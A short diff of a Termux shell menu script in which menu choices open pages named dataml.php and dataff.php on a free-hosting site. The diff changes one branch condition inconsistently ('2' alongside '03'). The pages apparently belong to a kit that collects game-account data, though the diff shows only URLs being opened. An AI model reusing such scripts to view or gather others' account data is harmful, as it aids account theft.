@@ -16,7 +16,7 @@ if [ $gameo = 1 ] || [ $gameo = 01 ];then
 termux-open https://bulan-bintang123.000webhostapp.com/dataml.php
 sleep 1
 sh menu.sh
-elif [ $gameo = 3 ] || [ $gameo = 03 ];then
+elif [ $gameo = 2 ] || [ $gameo = 03 ];then
 termux-open https://bulan-bintang123.000webhostapp.com/dataff.php
 sleep 1
 sh menu.sh
